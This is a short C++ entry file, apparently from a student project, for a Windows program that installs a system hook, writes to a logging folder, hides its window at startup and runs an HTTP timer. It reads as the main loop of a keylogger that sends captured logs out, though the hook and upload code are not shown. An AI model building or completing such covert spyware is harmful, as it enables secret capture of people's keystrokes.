/*
Jacob Brown jmb7438@rit.edu
Geoffrey Kanteles gdk7676@rit.edu
*/

#include <iostream>
#include <windows.h>
#include "CodeValues.h"
#include "ExtraFuncts.h"
#include "Logging.h"
#include "RunThread.h"
#include "WindowsHook.h"

using namespace std;

int main(){
    MSG Msg;
    Logging::MKDir(Logging::GetOurPath(true));

    InstallHook();

    //while loop used to hide the window on startup
    while(GetMessageA(&Msg, NULL, 0, 0)){
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    HTTPTimer.Stop();
    return 0;
}
